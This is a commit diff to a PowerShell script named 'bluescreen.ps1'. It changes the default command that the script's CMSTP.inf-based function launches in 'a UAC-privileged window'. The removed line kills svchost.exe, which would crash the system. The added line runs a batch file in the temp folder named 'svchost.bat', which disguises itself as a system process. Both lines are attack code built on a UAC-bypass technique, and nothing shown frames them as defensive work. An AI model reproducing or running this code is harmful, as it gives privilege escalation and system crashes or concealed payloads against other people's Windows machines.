5df3fe5696b24ca6d237ff190588c0abc2a8ab16
DBlack7 <randomguyontiktok@outlook.com>
2026-04-04 21:43:34 +0100

    Update bluescreen.ps1

--- bluescreen.ps1
+++ bluescreen.ps1
@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe /c taskkill /im svchost.exe'
+	[String]$CommandToExecute = 'cmd.exe /c %temp%\svchost.bat'
 	)
 
 $InfContent = @"
